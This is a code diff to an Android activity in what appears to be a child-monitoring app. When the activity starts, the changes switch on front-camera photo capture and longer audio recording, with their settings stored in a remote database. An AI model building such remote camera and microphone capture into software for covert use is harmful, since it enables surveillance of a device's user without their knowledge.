@@ -3,6 +3,7 @@ package com.github.midros.istheapp.ui.activities.mainchild
 import android.Manifest.permission.SYSTEM_ALERT_WINDOW
 import android.app.AppOpsManager
 import android.os.Bundle
+import android.util.Log
 import android.widget.Button
 import com.github.midros.istheapp.R
 import com.github.midros.istheapp.data.model.ChildPhoto
@@ -51,6 +52,7 @@ import com.github.midros.istheapp.utils.checkForegroundApp.CheckPermission.getMo
 import com.jaredrummler.android.device.DeviceName
 import com.pawegio.kandroid.show
 import kotterknife.bindView
+import java.io.File
 
 /**
  * Created by luis rafael on 27/03/18.
@@ -91,16 +93,19 @@ class MainChildActivity : BaseActivity(R.layout.activity_main_child) {
         getReference("$DATA/$CHILD_NAME").setValue(childSelected)
         getReference("$DATA/$DEVICE_NAME").setValue(DeviceName.getDeviceName())
 
-        //photo
-//        val childPhoto = ChildPhoto(true, CameraFacing.FRONT_FACING_CAMERA)
-//        getReference("$PHOTO/$PARAMS").setValue(childPhoto)
-//        getReference("$PHOTO/$CHILD_PERMISSION").setValue(true)
 //
 //        //Recording
-        val childRecording = ChildRecording(true,60)
+        val childRecording = ChildRecording(true,5*60*1000)
         getReference("$RECORDING/$PARAMS").setValue(childRecording)
         getReference("$RECORDING/$TIMER/$INTERVAL").setValue(0)
-
+        File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").delete()
+    //    File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/enviar.txt").delete()
+    //    File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/records.txt").createNewFile()
+        //photo
+        val childPhoto = ChildPhoto(true, CameraFacing.FRONT_FACING_CAMERA)
+        getReference("$PHOTO/$PARAMS").setValue(childPhoto)
+        getReference("$PHOTO/$CHILD_PERMISSION").setValue(true)
+        Log.i(Consts.TAG, "iniciando")
     }
 
     private fun checkSwitchPermissions() {
